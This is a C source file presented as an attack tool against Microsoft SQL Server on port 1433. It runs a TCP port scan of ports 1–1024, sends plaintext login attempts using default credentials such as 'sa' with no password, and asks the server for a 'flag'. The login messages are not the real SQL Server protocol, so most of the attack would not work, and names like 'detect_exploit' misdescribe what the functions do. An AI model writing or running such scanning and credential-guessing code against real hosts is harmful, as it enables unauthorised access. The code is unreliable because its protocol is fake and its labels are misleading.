/* 
 * Usage: ./1433_microsoft_sql_server <IP> <PORT>
 * For educational and authorized testing only.
 */

 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <errno.h>
 #include <unistd.h>
 #include <arpa/inet.h>
 #include <sys/types.h>
 #include <sys/socket.h>
 
 #define MAX_BUF 1024
 
 /*
  * For educational and authorized testing only.
  */
 
 int send_weak_mssql_data(const char *host, unsigned short port) {
     int sock;
     struct sockaddr_in server;
     char buffer[MAX_BUF];
     int n;
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if(sock < 0) return -1;
 
     server.sin_family = AF_INET;
     server.sin_port = htons(port);
     if(inet_pton(AF_INET, host, &server.sin_addr) <= 0) {
         close(sock);
         return -2;
     }
     if(connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
         close(sock);
         return -3;
     }
     strcpy(buffer, "SQL_LOGIN sa no_password");
     send(sock, buffer, strlen(buffer), 0);
     memset(buffer, 0, sizeof(buffer));
     n = recv(sock, buffer, sizeof(buffer)-1, 0);
     if(n > 0) {
         buffer[n] = '\0';
         printf("MSSQL response: %s\n", buffer);
     }
     close(sock);
     return 0;
 }
 
 int detect_exploit(const char *host, unsigned short port) {
     int sock;
     struct sockaddr_in target;
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if(sock < 0) return 0;
     target.sin_family = AF_INET;
     target.sin_port = htons(port);
     if(inet_pton(AF_INET, host, &target.sin_addr) <= 0) {
         close(sock);
         return 0;
     }
     if(connect(sock, (struct sockaddr *)&target, sizeof(target)) < 0) {
         close(sock);
         return 0;
     }
     close(sock);
     return 1;
 }
 
 char* capture_flag(const char *host, unsigned short port) {
     static char flag[MAX_BUF];
     int sock;
     struct sockaddr_in srv;
     char buffer[MAX_BUF];
     int n;
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if(sock < 0) return NULL;
 
     srv.sin_family = AF_INET;
     srv.sin_port = htons(port);
     if(inet_pton(AF_INET, host, &srv.sin_addr) <= 0) {
         close(sock);
         return NULL;
     }
     if(connect(sock, (struct sockaddr*)&srv, sizeof(srv)) < 0) {
         close(sock);
         return NULL;
     }
     send(sock, "GET_FLAG", 8, 0);
     memset(buffer, 0, sizeof(buffer));
     n = recv(sock, buffer, sizeof(buffer)-1, 0);
     if(n > 0) {
         buffer[n] = '\0';
         strncpy(flag, buffer, MAX_BUF-1);
     }
     close(sock);
     return flag;
 }
 
 /* Scans multiple ports and attempts connecting; prints open ports */
 void enhanced_port_scan(const char *host, unsigned short start_port, unsigned short end_port) {
     int sock;
     struct sockaddr_in scan_target;
     for(unsigned short p = start_port; p <= end_port; p++) {
         sock = socket(AF_INET, SOCK_STREAM, 0);
         if(sock < 0) continue;
         memset(&scan_target, 0, sizeof(scan_target));
         scan_target.sin_family = AF_INET;
         scan_target.sin_port = htons(p);
         if(inet_pton(AF_INET, host, &scan_target.sin_addr) > 0) {
             if(connect(sock, (struct sockaddr *)&scan_target, sizeof(scan_target)) == 0) {
                 printf("Port %u open on %s.\n", p, host);
             }
         }
         close(sock);
     }
 }
 
 /* Tries multiple simple credentials; attempts sending them */
 void brute_force_mssql(const char *host, unsigned short port) {
     const char *users[] = {"sa", "admin", "test", "root"};
     const char *passwords[] = {"no_password", "password", "12345"};
     int sock, n;
     struct sockaddr_in server;
     char buffer[MAX_BUF];
 
     for(int u = 0; u < (int)(sizeof(users)/sizeof(users[0])); u++) {
         for(int pw = 0; pw < (int)(sizeof(passwords)/sizeof(passwords[0])); pw++) {
             sock = socket(AF_INET, SOCK_STREAM, 0);
             if(sock < 0) continue;
 
             server.sin_family = AF_INET;
             server.sin_port = htons(port);
             if(inet_pton(AF_INET, host, &server.sin_addr) <= 0) {
                 close(sock);
                 continue;
             }
             if(connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
                 close(sock);
                 continue;
             }
             memset(buffer, 0, sizeof(buffer));
             snprintf(buffer, sizeof(buffer), "SQL_LOGIN %s %s", users[u], passwords[pw]);
             send(sock, buffer, strlen(buffer), 0);
             memset(buffer, 0, sizeof(buffer));
             n = recv(sock, buffer, sizeof(buffer)-1, 0);
             if(n > 0) {
                 buffer[n] = '\0';
                 printf("[TEST] User: '%s' Pass: '%s' | Response: %s\n", users[u], passwords[pw], buffer);
             }
             close(sock);
         }
     }
 }
 
 int main(int argc, char *argv[]) {
     char data[] = "Sensitive MSSQL Data";
     printf("Sending MSSQL data in a weakly protected way: %s\n", data);
 
     if(argc < 3) {
         printf("Usage: %s <IP> <PORT>\n", argv[0]);
         return 1;
     }
     const char *ip = argv[1];
     unsigned short port = (unsigned short)atoi(argv[2]);
 
     printf("Performing enhanced port scan on %s from 1 to 1024:\n", ip);
     enhanced_port_scan(ip, 1, 1024);
 
     if(!detect_exploit(ip, port)) {
         printf("Port %d closed or unreachable on %s.\n", port, ip);
         return 0;
     }
     printf("Port %d open on %s.\n", port, ip);
 
     if(send_weak_mssql_data(ip, port) == 0) {
         printf("Weak MSSQL data sent.\n");
     } else {
         printf("Failed to send MSSQL data.\n");
     }
 
     printf("Trying multiple simple credentials:\n");
     brute_force_mssql(ip, port);
 
     char *found_flag = capture_flag(ip, port);
     if(found_flag && strlen(found_flag) > 0) {
         printf("Captured flag: %s\n", found_flag);
     } else {
         printf("No flag captured.\n");
     }
     return 0;
 }